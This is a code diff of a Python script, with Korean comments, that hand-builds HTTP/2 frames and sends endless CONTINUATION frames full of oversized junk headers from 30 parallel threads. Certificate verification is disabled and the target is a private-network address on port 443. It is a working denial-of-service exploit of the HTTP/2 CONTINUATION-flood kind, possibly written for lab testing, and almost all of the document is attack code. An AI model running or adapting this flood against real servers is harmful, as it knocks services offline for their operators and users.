@@ -1,16 +1,15 @@
 from hpack import Encoder
 import threading
 from hyperframe.frame import HeadersFrame, ContinuationFrame, SettingsFrame, WindowUpdateFrame
-# import h2.connection # h2 install --> 3.2.0v  [pip install h2==3.2.0]
-# import h2.events # h2 lib modify --> [flags.py : collections --> collections.abc]
 import socket
 import ssl
 from multiprocessing import Process, current_process
 
+# hpack을 사용하여 header 크기 압축
 def hpack_header(i):
-    encoder = Encoder()  # Encoder 초기화
-    name = f'ssssssssssssssssssssshhhhhhhhhhhhhhhhhhhhhhhwwwwwwwwwwwwwwwwwshwshwssssssssshhhhhhhhhhhwwwwwwwwwwww{1}'
-    value = f'03310331033198989803319898033198980331998980331033103310331989898033198980331989803319989803319898{1}'
+    encoder = Encoder()
+    name = f'ssssssssssssssssssssshhhhhhhhhhhhhhhhhhhhhhhwwwwwwwwwwwwwwwwwshwshwssssssssshhhhhhhhhhhwwwwwwwwwwww{i}'
+    value = f'03310331033198989803319898033198980331998980331033103310331989898033198980331989803319989803319898{i}'
 
     headers = [(name, value)]
     encoded_headers = encoder.encode(headers)
@@ -24,52 +23,32 @@ def send_http2_request(host, port, use_ssl):
     # localhost 인증서 검증 무시
     if use_ssl:
         context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-        context.check_hostname = False  # 이 줄을 추가하여 check_hostname 비활성화
+        context.check_hostname = False
         context.verify_mode = ssl.CERT_NONE
         sock = context.wrap_socket(sock, server_hostname=host)
 
     # HTTP/2 연결 설정
     settings_frame = SettingsFrame(0)
-    window_update_frame = window_update_frame(0)
+    window_update_frame = WindowUpdateFrame(0)
     window_update_frame.window_increment = 65535
-    
-    # conn = h2.connection.H2Connection()
-    # conn.initiate_connection()
-    # sock.sendall(conn.data_to_send())  # 함수 호출 추가
 
-    # header frame
-    headers = [
-        (':method', 'GET'),
-        (':authority', host),
-        (':scheme', 'https' if use_ssl else 'http'),
-        (':path', '/'),
-    ]
+    # HTTP/2 프레임 전송
+    sock.sendall(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n' + settings_frame.serialize() + window_update_frame.serialize())
 
-    # hpack header 추가
-    hpack_headers = hpack_header()
-    headers.append(('custom-header', hpack_headers))  # HPACK 헤더 바이너리 데이터 추가
+    headers_frame = HeadersFrame(1)
+    headers_frame.data = b'\x82\x86\x41\x86\xa0\xe4\x1d\x13\x9d\x09\x84\x7a\x88\x25\xb6\x50\xc3\xcb\xb8\xb8\x3f\x53\x03\x2a\x2f\x2a'
+    headers_frame.flags.add('END_HEADERS')
 
-    conn.send_headers(1, headers)
-    sock.sendall(conn.data_to_send())  # 함수 호출 추가
+    sock.sendall(headers_frame.serialize())
 
-    # 응답 확인
+    # HTTP/2 프레임 반복 생성
+    i = 0
     while True:
-        data = sock.recv(65535)
-        if not data:
-            break
-        events = conn.receive_data(data)
-        for event in events:
-            if isinstance(event, h2.events.ResponseReceived):
-                print(event.headers)
-            if isinstance(event, h2.events.DataReceived):
-                print(event.data)
-            if isinstance(event, h2.events.StreamEnded):
-                break
-
-    # 연결 종료
-    conn.close_connection()
-    sock.sendall(conn.data_to_send())  # 함수 호출 추가
-    sock.close()
+        continuation_frame = ContinuationFrame(1)
+        continuation_frame.data = hpack_header(i)
+        continuation_frame.flags.add('END_HEADERS')
+        sock.sendall(continuation_frame.serialize())
+        i += 1
 
 def thread_send(host, port, use_ssl):
     while True:
@@ -83,11 +62,11 @@ def main():
     host = '192.168.56.1'
     port = 443
     use_ssl = True
-    num_threads = 50
+    num_threads = 30
 
     threads = []
     for i in range(num_threads):
-        thread = threading.Thread(target=thread_send, args=(host, port, use_ssl))
+        thread = threading.Thread(target=thread_send, args=(host, port, use_ssl), name=f'Process-{i}')
         threads.append(thread)
         thread.start()
 
